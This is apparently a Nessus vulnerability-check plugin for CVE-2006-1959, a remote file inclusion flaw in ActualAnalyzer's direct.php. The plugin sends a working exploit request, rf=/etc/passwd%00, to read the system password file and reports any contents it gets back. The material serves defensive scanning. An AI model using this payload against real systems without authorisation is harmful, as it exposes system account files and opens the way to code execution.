#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21244);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-1959");
  script_bugtraq_id(17597);
  script_xref(name:"OSVDB", value:"24778");

  script_name(english:"ActualAnalyzer direct.php rf Variable Remote File Inclusion");
  script_summary(english:"Tries to read /etc/passwd using ActualAnalyzer");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ActualAnalyzer, a PHP-based tool for
monitoring web site traffic. 

The version of ActualAnalyzer installed on the remote host fails to
sanitize input to the 'rf' parameter of the 'direct.php' script before
using it in PHP 'require()' functions.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this issue to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/431351/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/actualanalyzer", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port:port,
    item:string(
      dir, "/direct.php?",
      "rf=", file));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0common/.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");

    if (isnull(contents)) security_hole(port);
    else
    {
      report = string(
        "\n",
        "Here are the repeated contents of the file '/etc/passwd'\n",
        "that Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    exit(0);
  }
}
